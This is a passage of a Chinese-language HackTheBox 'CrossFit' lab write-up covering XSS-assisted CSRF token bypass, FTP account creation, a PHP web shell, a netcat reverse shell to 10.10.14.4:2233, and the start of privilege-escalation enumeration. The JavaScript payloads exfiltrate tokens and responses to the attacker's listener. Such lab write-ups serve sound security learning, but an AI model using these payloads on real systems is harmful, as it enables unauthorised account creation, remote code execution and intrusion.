class="string">&quot;Username&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12 col-sm-12 col-md-12&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">strong</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12 col-sm-12 col-md-12 text-center&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>还有token，尝试两次，发现token会变，不能直接CSRF，好家伙…</p>
+<p>一般来说，token是与会话绑定的，不同的会话token不一样，相同会话token一致，也就是说我们要通过xhr保持同一个会话，而不是先拿了token，等下 一次请求，会话不一致，还是创建不了帐号。</p>
+<h3 id="结合-xss-bypass-anti-csrf-token-进行-CSRF"><a href="#结合-xss-bypass-anti-csrf-token-进行-CSRF" class="headerlink" title="结合 xss bypass anti-csrf-token  进行 CSRF"></a>结合 xss bypass anti-csrf-token  进行 CSRF</h3><p>攻击流程如下</p>
+<ul>
+<li>获取 <code>/accounts/create</code> 页面</li>
+<li>解析返回页面dom节点获取 <code>_token</code> 值</li>
+<li>带上 <code>_token</code> 向 <code>http://ftp.crossfit.htb/accounts</code> 接口发送 POST请求，并创建一个帐号密码为 tari/tari 的帐号</li>
+<li>把请求结果待会本机监听的 <code>nc</code> 端口</li>
+</ul>
+<p>构造payload3.js，获取token</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// 通过解析 /accounts/create 页面 DOM 节点获取 _token</span></span><br><span class="line">        <span class="keyword">var</span> parser = <span class="keyword">new</span> DOMParser();</span><br><span class="line">        <span class="keyword">var</span> doc = parser.parseFromString(<span class="built_in">this</span>.responseText, <span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> token = doc.getElementsByName(<span class="string">&#x27;_token&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="comment">// 返回 _token 给本机监听的 nc 端口</span></span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span> + token, <span class="literal">false</span>);</span><br><span class="line">        xhr2.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 获取 /accounts/create 页面</span></span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
+
+<p>正常获取</p>
+<p><img src="/img/htb-crossfit/image-20210814145932159.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814145932159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814145932159"></p>
+<p>构造payload4.js，这里注意需要设置 <code>withCredentials = true</code> 才能保证两个他们在同一会话中，见<a href="#2%E3%80%81xhr%E5%90%8C%E4%BC%9A%E8%AF%9D%E9%97%AE%E9%A2%98">遇到的问题2</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// 通过解析 /accounts/create 页面 DOM 节点获取 _token</span></span><br><span class="line">        <span class="keyword">var</span> parser = <span class="keyword">new</span> DOMParser();</span><br><span class="line">        <span class="keyword">var</span> doc = parser.parseFromString(<span class="built_in">this</span>.responseText, <span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> token = doc.getElementsByName(<span class="string">&#x27;_token&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// 3）创建结果返回给本机监听的 nc 端口</span></span><br><span class="line">                <span class="keyword">var</span> xhr3 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">                xhr3.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span> + btoa(<span class="built_in">this</span>.responseText), <span class="literal">false</span>);</span><br><span class="line">                xhr3.send();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 2）带上 _token 创建 tari 用户</span></span><br><span class="line">        xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        xhr2.withCredentials = <span class="literal">true</span>;</span><br><span class="line">        xhr2.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> params = <span class="string">&quot;username=tari&amp;pass=tari&amp;_token=&quot;</span> + token;</span><br><span class="line">        xhr2.send(params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 1) 获取 /accounts/create 页面</span></span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
+
+<p>ok</p>
+<p><img src="/img/htb-crossfit/image-20210814154031001.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814154031001.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814154031001"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12 margin-tb&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-left&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-right&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>&gt;</span> Create New Account<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-success&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Account created successfully.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-bordered&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>No<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Creation Date<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span> <span class="attr">width</span>=<span class="string">&quot;280px&quot;</span>&gt;</span>Action<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>tari<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2021-08-14 07:39:54<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/72&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-info&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/72&quot;</span>&gt;</span>Show<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/72/edit&quot;</span>&gt;</span>Edit<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;BO5j5UOlBonjTsv0Y317c3t3G1JJyoZ6hdbw6cLm&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;DELETE&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>sheeraz<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2021-08-14 07:32:44<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/71&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-info&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/71&quot;</span>&gt;</span>Show<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/71/edit&quot;</span>&gt;</span>Edit<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;BO5j5UOlBonjTsv0Y317c3t3G1JJyoZ6hdbw6cLm&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;DELETE&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建成功了。</p>
+<p><img src="/img/htb-crossfit/image-20210814154222759.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814154222759.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814154222759"></p>
+<p>之前说过，这个应该是网站部署的vsftp帐号，尝试通过 tari/tari 登录</p>
+<p><img src="/img/htb-crossfit/image-20210814155722576.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814155722576.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814155722576"></p>
+<p>命令行的话需要下载 lftp 才能连，ftp没有支持 SSL协议</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> ftp:ssl-force <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> ssl:verify-certificate no</span><br><span class="line">connect 10.10.10.208</span><br><span class="line">login tari tari</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210814160858543.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814160858543.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814160858543"></p>
+<p>连不了。。？不是，那我图形化怎么连上的？…. emm，过了两个小时又可以了，晕（破案了，好像机器会每隔一段时间清理用户和文件之类的，要重新打一下添加用户，然后就可以正常了~）</p>
+<p><img src="/img/htb-crossfit/image-20210814184926796.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814184926796.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814184926796"></p>
+<p>看了下权限，除了 <code>development-test</code> 目录其他没法写权限。</p>
+<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>先写个PHP一句话进去，s.php 内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;s&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据命名规则，先试试 <code>development-test.crossfit.htb</code> 可不可以通过外网访问</p>
+<p><img src="/img/htb-crossfit/image-20210814185306387.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814185306387.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814185306387"></p>
+<p>意料之中无法访问</p>
+<p><img src="/img/htb-crossfit/image-20210814163119126.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814163119126.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814163119126"></p>
+<p>没事，我们文件上传上去了，可以通过 XSS+CSRF让管理员帮我们访问 （</p>
+<p>payload5.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://development-test.crossfit.htb/s.php?s=nc+10.10.14.4+2233+-e+/bin/bash&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell（一开始弹了半天，结果发现环境好像每隔一段时间会重置的….毕竟是共享环境2333）</p>
+<p><img src="/img/htb-crossfit/image-20210814192606606.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814192606606.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814192606606"></p>
+<p>获取一个TTY shell，不然到时候提权了用户都切不了 （</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>; </span><br></pre></td></tr></table></figure>
+
+<h2 id="阶段总结"><a href="#阶段总结" class="headerlink" title="阶段总结"></a>阶段总结</h2><p>原本对同源策略、JSONP、httponly搞的模模糊糊的，以及他们的作用范围和利用方法，经过环境的调试，在看看以前看过的文章，怎样可行，怎样不可行，终于理解清楚了~</p>
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="权限提升-获取普通用户权限"><a href="#权限提升-获取普通用户权限" class="headerlink" title="权限提升 - 获取普通用户权限"></a>权限提升 - 获取普通用户权限</h3><ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">linux-smart-enumeration</a> 没找到啥有用的</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">linux_exploit_suggester</a> 报了个错</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux-exploit-suggester.sh: line xxxx: cannot create temp file for here-document: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester/issues/55">解决方式传送门</a></p>
+<p>也没找到啥好用的，</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">linux_exploit_suggester-2</a> 也是没找到啥</li>
+</ul>
+<p>从系统中找所有用户可读文件，这也太多了吧（</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -xdev -<span class="built_in">type</span> d -perm -0001 -ls</span><br></pre></td></tr></table></figure>
+
+<p>这个思路挺好的，看到 ansible 去找 playbook，不过就是输出太多，很容器看漏的…</p>
+<p>这里安利一个开源项目</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
+<p>通过linpeas 很容易发现了个街上最靓的仔<br><img src="/img/htb-crossfit/image-20210814220220687.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814220220687.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814220220687"></p>
+<p>此外还发现了个isaac用户的计划任务，不过这个文件要 admins组才能编辑</p>
